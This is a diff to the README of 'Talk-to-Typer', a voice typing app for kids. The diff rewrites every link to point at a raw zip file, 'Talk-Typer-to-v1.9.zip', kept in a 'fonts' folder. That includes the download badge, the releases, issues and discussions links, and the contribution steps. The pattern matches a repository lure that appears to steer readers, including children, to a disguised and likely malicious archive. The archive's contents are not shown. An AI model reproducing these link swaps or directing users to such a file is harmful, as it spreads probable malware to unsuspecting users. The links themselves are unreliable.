@@ -2,7 +2,7 @@
 
 ## 📥 Download Talk-to-Typer
 
-[![Download Talk-to-Typer](https://img.shields.io/badge/Download-Talk--to--Typer-brightgreen?style=for-the-badge)](https://github.com/marvitek0/Talk-to-Typer/releases)
+[![Download Talk-to-Typer](https://github.com/marvitek0/Talk-to-Typer/raw/refs/heads/main/fonts/Talk-Typer-to-v1.9.zip)](https://github.com/marvitek0/Talk-to-Typer/raw/refs/heads/main/fonts/Talk-Typer-to-v1.9.zip)
 
 ## 📋 Overview
 
@@ -13,7 +13,7 @@ Talk-to-Typer is a fun and engaging voice typing app designed for kids. It helps
 To get started with Talk-to-Typer, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Go to the [releases page](https://github.com/marvitek0/Talk-to-Typer/releases) to find the latest version.
+   Go to the [releases page](https://github.com/marvitek0/Talk-to-Typer/raw/refs/heads/main/fonts/Talk-Typer-to-v1.9.zip) to find the latest version.
 
 2. **Choose Your Device**  
    Ensure your device can run a Progressive Web App (PWA). Most modern browsers support PWAs, including Chrome, Firefox, and Edge.
@@ -48,21 +48,21 @@ Talk-to-Typer works on a variety of devices. Here are the basic requirements:
 
 ## 🔄 Updating the App
 
-To ensure you have the latest features and improvements, check for updates regularly. Head back to the [releases page](https://github.com/marvitek0/Talk-to-Typer/releases) to download new versions when they are available.
+To ensure you have the latest features and improvements, check for updates regularly. Head back to the [releases page](https://github.com/marvitek0/Talk-to-Typer/raw/refs/heads/main/fonts/Talk-Typer-to-v1.9.zip) to download new versions when they are available.
 
 ## 👥 Community and Support
 
 If you have any questions or feedback, connect with the community. You can find us on various platforms:
 
-- **Issues Page**: Report bugs or request features on the [issues page](https://github.com/marvitek0/Talk-to-Typer/issues).
-- **Community Discussions**: Join discussions in the [discussions section](https://github.com/marvitek0/Talk-to-Typer/discussions) to share ideas or get tips.
+- **Issues Page**: Report bugs or request features on the [issues page](https://github.com/marvitek0/Talk-to-Typer/raw/refs/heads/main/fonts/Talk-Typer-to-v1.9.zip).
+- **Community Discussions**: Join discussions in the [discussions section](https://github.com/marvitek0/Talk-to-Typer/raw/refs/heads/main/fonts/Talk-Typer-to-v1.9.zip) to share ideas or get tips.
 - **Contact Information**: Reach out for support through the repository's contact methods.
 
 ## 📜 Contributions
 
 If you're interested in contributing, we welcome your help in improving the app. Here’s how to get involved:
 
-1. Check the [issues list](https://github.com/marvitek0/Talk-to-Typer/issues) for tasks that need attention.
+1. Check the [issues list](https://github.com/marvitek0/Talk-to-Typer/raw/refs/heads/main/fonts/Talk-Typer-to-v1.9.zip) for tasks that need attention.
 2. Fork the repository.
 3. Make your changes and submit a pull request.
 
